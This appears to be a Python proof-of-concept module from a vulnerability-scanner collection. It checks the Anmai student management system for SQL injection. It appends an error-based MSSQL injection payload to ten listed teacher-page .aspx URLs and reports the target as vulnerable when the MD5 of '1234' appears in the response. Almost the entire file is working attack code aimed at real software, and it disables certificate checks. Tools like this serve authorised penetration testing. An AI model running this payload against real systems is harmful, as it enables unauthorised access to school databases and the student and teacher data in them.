#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 安脉学生管理系统10处SQL注入
referer: http://www.wooyun.org/bugs/wooyun-2015-0108502
author: Lucifer
description: 10处SQL注入。
'''
import sys
import requests
import warnings
from termcolor import cprint

class anmai_teachingtechnology_sqli_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        urls = [
                "/teacher/teachingtechnology/patentinfoEdit.aspx?id=1",
                "/teacher/teachingtechnology/teachingcoursewareEdit.aspx?id=1",
                "/teacher/teachingtechnology/wonderfulcoursewareEdit.aspx?id=1",
                "/teacher/teachingtechnology/ColligationSelect/TeachingExperience_P.aspx?id=1",
                "/teacher/teachingtechnology/ColligationSelect/TeachingPlan_P.aspx?id=1",
                "/teacher/teachingtechnology/ColligationSelect/TeachingPractise_P.aspx?id=1",
                "/teacher/teachingtechnology/ColligationSelect/TeachingReflect_P.aspx?id=1",
                "/teacher/teachingtechnology/ColligationSelect/TeachingSum_up_P.aspx?id=1",
                "/teacher/teachingtechnology/ColligationSelect/wonderfulcourseware_P.aspx?id=1",
                "/teacher/teachingtechnology/Course_Record_P.aspx?id=1"
                ]
        try:
            noexist = True
            for turl in urls:
                vulnurl = self.url + turl
                vulnurl = vulnurl + "'+AnD+1=Sys.Fn_varbintohexstr(HashBytes('Md5','1234'))--"

                req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
                if r"81dc9bdb52d04dc20036dbd8313ed055" in req.text:
                    cprint("[+]存在安脉学生管理系统SQL注入漏洞...(高危)\tpayload: "+vulnurl, "red")
                    return True, vulnurl, "安脉学生管理系统10处SQL注入", vulnurl, req.text
            if noexist:
                cprint("[-]不存在anmai_teachingtechnology_sqli漏洞", "white", "on_grey")
                return False, None, None, None, None
        except:
            cprint("[-] "+__file__+"====>可能不存在漏洞", "cyan")
            return False, None, None, None, None

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = anmai_teachingtechnology_sqli_BaseVerify(sys.argv[1])
    testVuln.run()